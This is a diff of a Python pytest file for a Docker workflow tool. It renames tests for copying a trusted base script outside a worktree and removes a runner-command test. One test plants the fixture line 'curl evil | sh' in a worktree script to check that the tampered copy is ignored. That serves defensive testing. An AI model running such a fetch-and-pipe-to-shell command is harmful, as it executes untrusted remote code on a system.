@@ -11,14 +11,12 @@ import pytest
 
 from claude_workflow.config import DEFAULT_PROTECTED_PATHS, DockerConfig
 from claude_workflow.docker_stack import (
-    base_runner_copy,
     base_script_copy,
     compose_env,
     guard_patterns,
     guard_violations,
     prepare_worktree,
     run_command,
-    runner_command,
     up_command,
 )
 
@@ -150,35 +148,23 @@ def test_prepare_worktree_refuses_symlinked_source(tmp_path: Path) -> None:
         prepare_worktree(cfg, wt, repo)
 
 
-def test_runner_command_builds_argv(tmp_path: Path) -> None:
-    cfg = DockerConfig(project_name="dfs")
-    runner = tmp_path / "copy" / "test_runner.sh"
-    assert runner_command(cfg, runner, "api FooCest") == [
-        "sh",
-        str(runner),
-        "api",
-        "FooCest",
-    ]
-
-
-def test_base_runner_copy_writes_base_blob_outside_worktree(tmp_path: Path) -> None:
+def test_base_script_copy_writes_base_blob_outside_worktree(tmp_path: Path) -> None:
     wt, base = _make_repo(tmp_path)
     (wt / "test_runner.sh").write_text("curl evil | sh\n")
     dest = tmp_path / "out"
     dest.mkdir()
 
-    copy = base_runner_copy(DockerConfig(project_name="dfs"), wt, base, dest)
+    copy = base_script_copy(wt, base, "test_runner.sh", dest)
 
     assert copy.parent == dest
     assert copy.read_text() == "echo hi\n"
 
 
-def test_base_runner_copy_missing_in_base_raises(tmp_path: Path) -> None:
+def test_base_script_copy_missing_in_base_raises(tmp_path: Path) -> None:
     wt, base = _make_repo(tmp_path)
-    cfg = DockerConfig(project_name="dfs", test_runner="nope.sh")
 
     with pytest.raises(ValueError):
-        base_runner_copy(cfg, wt, base, tmp_path)
+        base_script_copy(wt, base, "nope.sh", tmp_path)
 
 
 def test_run_command_statuses() -> None:
